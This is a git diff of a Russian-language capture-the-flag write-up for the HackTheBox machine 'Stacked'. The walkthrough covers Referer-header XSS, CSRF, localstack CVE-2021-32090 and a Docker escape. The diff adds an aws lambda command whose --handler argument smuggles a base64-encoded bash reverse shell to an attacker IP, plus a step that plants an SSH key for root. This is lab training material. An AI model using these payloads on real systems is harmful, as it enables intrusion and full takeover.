@@ -29,6 +29,8 @@ Service Info: Host: stacked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 С формой я сделать так ничего и не смог, поэтому пошел дальше.
 
+### Находим имя домена и один поддомен:
+
 Так как в тегах \<title>STACKED.HTB\</title>, то скорее всего, это реальное имя домена, следовательно вносим его в /etc/hosts и можно фаззить поддомены.
 
 ```
@@ -102,7 +104,7 @@ services:
 
 ![](../.gitbook/assets/4.png)
 
-'
+### Получаем XSS в HTTP-заголовке Referer:
 
 ![](<../.gitbook/assets/5 (5).png>)
 
@@ -131,6 +133,8 @@ fullname=tragernout&email=tragernout%40stacked.htb&tel=000000000000&subject=test
 Чтобы увидеть HTTP заголовки реквеста админа, который "пытается" получить index.js можно использовать netcat:
 
 ![](<../.gitbook/assets/8 (1).png>)
+
+### Эксплуатируем XSS+CSRF, чтобы прочитать сообщения от имени админа на другом поддомене:
 
 Мы можем добавить поддомен mail.stacked.htb в наш /etc/hosts, но на него мы все равно не сможем попасть, потому что там скорее всего стоит защита и можно попасть на него только с localhost.
 
@@ -172,6 +176,8 @@ secondReq.send(response);
 
 `<p>Hey Adam, I have set up S3 instance on s3-testing.stacked.htb so that you can configure the IAM users, roles and permissions. I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances. If you need anything let me know. Thanks.</p>`
 
+### Обнаружение нового домена и эксплуатация CVE-2021-32090:
+
 Добавляем поддомен s3-testing.stacked.htb в /etc/hosts.
 
 ![](../.gitbook/assets/10.png)
@@ -211,6 +217,8 @@ $ aws lambda --endpoint=http://s3-testing.stacked.htb create-function --function
 
 ![](../.gitbook/assets/14.png)
 
+### Получаем реверс шелл с помощью CVE-2021-32090:
+
 Теперь можно прокинуть реверс шелл. Заворачиваем его в base64, чтобы не было никаких проблем при передаче:
 
 ```
@@ -235,4 +243,34 @@ $ nc -nlvp 9898
 
 ![](../.gitbook/assets/16.png)
 
-Теперь нам нужно прокинуть pspy на нашу машину
+### Обнаружение мисконфигов с помощью PSPY:
+
+Теперь нам нужно прокинуть pspy на атакуемый хост и запустить:
+
+![](../.gitbook/assets/17.png)
+
+Теперь, если мы выполним действия создания функции и ее проверки:
+
+![](../.gitbook/assets/18.png)
+
+У нас появляется много векторов атак. Поэтому можно попробовать пробросить шелл от рута с помощью параметра --handler:
+
+```
+$ aws lambda --endpoint=http://s3-testing.stacked.htb create-function --function-name 'func1' --role user --handler '$(echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45My85ODk4IDA+JjE="|base64 -d|bash)' --runtime nodejs10.x --zip-file fileb://index.zip
+```
+
+```
+$ aws lambda --endpoint=http://s3-testing.stacked.htb invoke --function-name func1 out
+```
+
+![](../.gitbook/assets/19.png)
+
+### Получение рута с помощью другого образа докера:
+
+Теперь можем посмотреть все образы докера и попытаться присоедениться к "другому" локалстаку:
+
+![](../.gitbook/assets/20.png)
+
+И мы опять оказались в докере, но теперь мы можем прочитать root.txt, чтобы получить ssh-доступ от рута, нужно вписать свой SSH Public Key в /mnt/root/.ssh/authorized\_keys.
+
+![](../.gitbook/assets/21.png)
